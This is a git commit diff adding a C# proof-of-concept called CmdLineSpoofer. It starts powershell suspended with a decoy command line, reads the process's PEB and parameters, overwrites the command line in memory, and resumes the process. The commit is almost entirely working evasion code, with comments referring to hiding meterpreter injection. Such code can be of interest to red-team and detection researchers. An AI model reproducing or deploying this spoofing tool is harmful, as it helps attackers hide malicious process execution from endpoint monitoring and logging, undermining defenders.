15a8ab1df8d1edf78f753a6cdfc94064ac5a31c4
plackyhacker <john.tear@mac.com>
2021-12-27 20:05:24 +0000

    Completed first PoC.

---
+++ CmdLineSpoofer/Native.cs
@@ -0,0 +1,225 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace CmdLineSpoofer
+{
+    public class Native
+    {
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern int NtQueryInformationProcess(IntPtr hProcess, PROCESSINFOCLASS pic, out PROCESS_BASIC_INFORMATION pbi, int cb, out int pSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint ResumeThread(IntPtr hThread);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public unsafe struct PEB
+        {
+            public fixed byte Filler[16];
+            // we don't care too much for the preceeding elements in the struct
+
+            public IntPtr ImageBaseAddress;
+            public IntPtr Ldr;
+            public IntPtr ProcessParameters;
+
+            // we don't care too much for the rest of the struct
+        };
+
+        [StructLayout(LayoutKind.Sequential)]
+        public unsafe struct RTL_USER_PROCESS_PARAMETERS
+        {
+            public fixed byte Filler[112];
+            // we don't care too much for the preceeding elements in the struct
+
+            public ushort Length;
+            public ushort MaximumLength;
+            public IntPtr CommandLine;
+
+            // we don't care too much for the rest of the struct
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public unsafe byte* lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [Flags]
+        public enum CreateProcessFlags
+        {
+            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+            CREATE_NEW_CONSOLE = 0x00000010,
+            CREATE_NEW_PROCESS_GROUP = 0x00000200,
+            CREATE_NO_WINDOW = 0x08000000,
+            CREATE_PROTECTED_PROCESS = 0x00040000,
+            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+            CREATE_SEPARATE_WOW_VDM = 0x00000800,
+            CREATE_SHARED_WOW_VDM = 0x00001000,
+            CREATE_SUSPENDED = 0x00000004,
+            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+            DEBUG_PROCESS = 0x00000001,
+            DETACHED_PROCESS = 0x00000008,
+            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+            INHERIT_PARENT_AFFINITY = 0x00010000
+        }
+
+        public struct PROCESS_BASIC_INFORMATION
+        {
+            public int ExitStatus;
+            public IntPtr PebBaseAddress;
+            public UIntPtr AffinityMask;
+            public int BasePriority;
+            public UIntPtr UniqueProcessId;
+            public UIntPtr InheritedFromUniqueProcessId;
+        }
+
+        public enum PROCESSINFOCLASS
+        {
+            ProcessBasicInformation = 0x00,
+            ProcessQuotaLimits = 0x01,
+            ProcessIoCounters = 0x02,
+            ProcessVmCounters = 0x03,
+            ProcessTimes = 0x04,
+            ProcessBasePriority = 0x05,
+            ProcessRaisePriority = 0x06,
+            ProcessDebugPort = 0x07,
+            ProcessExceptionPort = 0x08,
+            ProcessAccessToken = 0x09,
+            ProcessLdtInformation = 0x0A,
+            ProcessLdtSize = 0x0B,
+            ProcessDefaultHardErrorMode = 0x0C,
+            ProcessIoPortHandlers = 0x0D,
+            ProcessPooledUsageAndLimits = 0x0E,
+            ProcessWorkingSetWatch = 0x0F,
+            ProcessUserModeIOPL = 0x10,
+            ProcessEnableAlignmentFaultFixup = 0x11,
+            ProcessPriorityClass = 0x12,
+            ProcessWx86Information = 0x13,
+            ProcessHandleCount = 0x14,
+            ProcessAffinityMask = 0x15,
+            ProcessPriorityBoost = 0x16,
+            ProcessDeviceMap = 0x17,
+            ProcessSessionInformation = 0x18,
+            ProcessForegroundInformation = 0x19,
+            ProcessWow64Information = 0x1A,
+            ProcessImageFileName = 0x1B,
+            ProcessLUIDDeviceMapsEnabled = 0x1C,
+            ProcessBreakOnTermination = 0x1D,
+            ProcessDebugObjectHandle = 0x1E,
+            ProcessDebugFlags = 0x1F,
+            ProcessHandleTracing = 0x20,
+            ProcessIoPriority = 0x21,
+            ProcessExecuteFlags = 0x22,
+            ProcessResourceManagement = 0x23,
+            ProcessCookie = 0x24,
+            ProcessImageInformation = 0x25,
+            ProcessCycleTime = 0x26,
+            ProcessPagePriority = 0x27,
+            ProcessInstrumentationCallback = 0x28,
+            ProcessThreadStackAllocation = 0x29,
+            ProcessWorkingSetWatchEx = 0x2A,
+            ProcessImageFileNameWin32 = 0x2B,
+            ProcessImageFileMapping = 0x2C,
+            ProcessAffinityUpdateMode = 0x2D,
+            ProcessMemoryAllocationMode = 0x2E,
+            ProcessGroupInformation = 0x2F,
+            ProcessTokenVirtualizationEnabled = 0x30,
+            ProcessConsoleHostProcess = 0x31,
+            ProcessWindowInformation = 0x32,
+            ProcessHandleInformation = 0x33,
+            ProcessMitigationPolicy = 0x34,
+            ProcessDynamicFunctionTableInformation = 0x35,
+            ProcessHandleCheckingMode = 0x36,
+            ProcessKeepAliveCount = 0x37,
+            ProcessRevokeFileHandles = 0x38,
+            ProcessWorkingSetControl = 0x39,
+            ProcessHandleTable = 0x3A,
+            ProcessCheckStackExtentsMode = 0x3B,
+            ProcessCommandLineInformation = 0x3C,
+            ProcessProtectionInformation = 0x3D,
+            ProcessMemoryExhaustion = 0x3E,
+            ProcessFaultInformation = 0x3F,
+            ProcessTelemetryIdInformation = 0x40,
+            ProcessCommitReleaseInformation = 0x41,
+            ProcessDefaultCpuSetsInformation = 0x42,
+            ProcessAllowedCpuSetsInformation = 0x43,
+            ProcessSubsystemProcess = 0x44,
+            ProcessJobMemoryInformation = 0x45,
+            ProcessInPrivate = 0x46,
+            ProcessRaiseUMExceptionOnInvalidHandleClose = 0x47,
+            ProcessIumChallengeResponse = 0x48,
+            ProcessChildProcessInformation = 0x49,
+            ProcessHighGraphicsPriorityInformation = 0x4A,
+            ProcessSubsystemInformation = 0x4B,
+            ProcessEnergyValues = 0x4C,
+            ProcessActivityThrottleState = 0x4D,
+            ProcessActivityThrottlePolicy = 0x4E,
+            ProcessWin32kSyscallFilterInformation = 0x4F,
+            ProcessDisableSystemAllowedCpuSets = 0x50,
+            ProcessWakeInformation = 0x51,
+            ProcessEnergyTrackingState = 0x52,
+            ProcessManageWritesToExecutableMemory = 0x53,
+            ProcessCaptureTrustletLiveDump = 0x54,
+            ProcessTelemetryCoverage = 0x55,
+            ProcessEnclaveInformation = 0x56,
+            ProcessEnableReadWriteVmLogging = 0x57,
+            ProcessUptimeInformation = 0x58,
+            ProcessImageSection = 0x59,
+            ProcessDebugAuthInformation = 0x5A,
+            ProcessSystemResourceManagement = 0x5B,
+            ProcessSequenceNumber = 0x5C,
+            ProcessLoaderDetour = 0x5D,
+            ProcessSecurityDomainInformation = 0x5E,
+            ProcessCombineSecurityDomainsInformation = 0x5F,
+            ProcessEnableLogging = 0x60,
+            ProcessLeapSecondInformation = 0x61,
+            ProcessFiberShadowStackAllocation = 0x62,
+            ProcessFreeFiberShadowStackAllocation = 0x63,
+            MaxProcessInfoClass = 0x64
+        };
+    }
+}
--- CmdLineSpoofer/Program.cs
+++ CmdLineSpoofer/Program.cs
@@ -1,8 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
+
+using static CmdLineSpoofer.Native;
 
 namespace CmdLineSpoofer
 {
@@ -10,7 +11,121 @@ namespace CmdLineSpoofer
     {
         static void Main(string[] args)
         {
+            // the command to spoof
+            string spoofedCommand = "powershell.exe /c Defo not injecting meterpreter...";
 
+            // the malicious command
+            string maliciousCommand = "powershell.exe\0";
+
+            Debug("[+] Spoofing command: " + spoofedCommand );
+
+            // spawn a process to spoof the command line of
+            STARTUPINFO si = new STARTUPINFO();
+            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
+            bool success = CreateProcess(null, spoofedCommand, ref sa, ref sa, false, CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, "C:\\windows\\", ref si, out PROCESS_INFORMATION pi);
+
+            if(!success)
+            {
+                Debug("[!] Unable to spawn process!");
+                return;
+            }
+
+            Debug("[+] Process spawned, PID: {0}", new string[] { pi.dwProcessId.ToString() });
+
+            // grab the PEB address of the newly spawned process
+            PROCESSINFOCLASS pic = new PROCESSINFOCLASS();
+            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+
+            int status = NtQueryInformationProcess(pi.hProcess, pic, out pbi, Marshal.SizeOf(pbi), out int retLength);
+
+            if (status != 0)
+            {
+                Debug("[!] Unable to read PEB address!");
+                return;
+            }
+
+            Debug("[+] PEB Address: 0x{0}", new string[] { pbi.PebBaseAddress.ToString("X") });
+
+            // read the PEB structure, so we can get  the ProcessParameters address
+            PEB peb;
+            byte[] pebBuffer = new byte[Marshal.SizeOf(new PEB())];
+            ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuffer, pebBuffer.Length, out IntPtr bytesRead);
+
+            unsafe
+            {
+                fixed (byte* ptr = pebBuffer)
+                {
+                    peb = (PEB)Marshal.PtrToStructure((IntPtr)ptr, typeof(PEB));
+                }
+            }
+
+            Debug("[+] ProcessParameters Address: 0x{0}", new string[] { peb.ProcessParameters.ToString("X") });
+
+            // read the ProcessParameters structure, so we can get the CmdLine address
+            RTL_USER_PROCESS_PARAMETERS procParams;
+            byte[] uppBuffer = new byte[Marshal.SizeOf(new RTL_USER_PROCESS_PARAMETERS())];
+            ReadProcessMemory(pi.hProcess, peb.ProcessParameters, uppBuffer, uppBuffer.Length, out bytesRead);
+
+            unsafe
+            {
+                fixed (byte* ptr = uppBuffer)
+                {
+                    procParams = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure((IntPtr)ptr, typeof(RTL_USER_PROCESS_PARAMETERS));
+                }
+            }
+
+            Debug("[+] CommandLine Address: 0x{0}", new string[] { procParams.CommandLine.ToString("X") });
+
+            // read the CommandLine address
+            string cmdLine;
+            byte[] cmdLineBytes = new byte[procParams.Length];
+            ReadProcessMemory(pi.hProcess, procParams.CommandLine, cmdLineBytes, cmdLineBytes.Length, out bytesRead);
+
+            unsafe
+            {
+                fixed (byte* ptr = cmdLineBytes)
+                {
+                    cmdLine = Encoding.Unicode.GetString(cmdLineBytes);
+                }
+            }
+
+            Debug("[+] Original CommandLine: {0}", new string[] { cmdLine });
+
+            // todo: write the new spoofed PEB back to memory
+            // we need to write byte array to procParams.CommandLine
+            byte[] newCmdLine = Encoding.Unicode.GetBytes(maliciousCommand);
+            WriteProcessMemory(pi.hProcess, procParams.CommandLine, newCmdLine, newCmdLine.Length, out IntPtr lpNumberOfBytesWritten);
+
+            // we also need to write new size as ushort to peb.ProcessParameters  + 112 bytes
+            byte[] sizeOfCmdLine = BitConverter.GetBytes((ushort)(newCmdLine.Length));
+            WriteProcessMemory(pi.hProcess, IntPtr.Add(peb.ProcessParameters, 112), sizeOfCmdLine, sizeOfCmdLine.Length, out lpNumberOfBytesWritten);
+
+            Debug("[+] New CommandLine: {0}, written to process", new string[] { cmdLine });
+
+            // resume the process
+            ResumeThread(pi.hThread);
+
+            Debug("[+] Resuming process");
+
+            //Console.WriteLine("Press a key to end...");
+            //Console.ReadLine();
+
+            // kill the process - temp - can be removed later
+            //Process.GetProcessById(pi.dwProcessId).Kill();
+        }
+
+        public static void Debug(string text, string[] args)
+        {
+#if DEBUG
+            Console.WriteLine(text, args);
+#endif
+        }
+
+        public static void Debug(string text)
+        {
+#if DEBUG
+            Console.WriteLine(text, new string[] { });
+#endif
         }
     }
 }
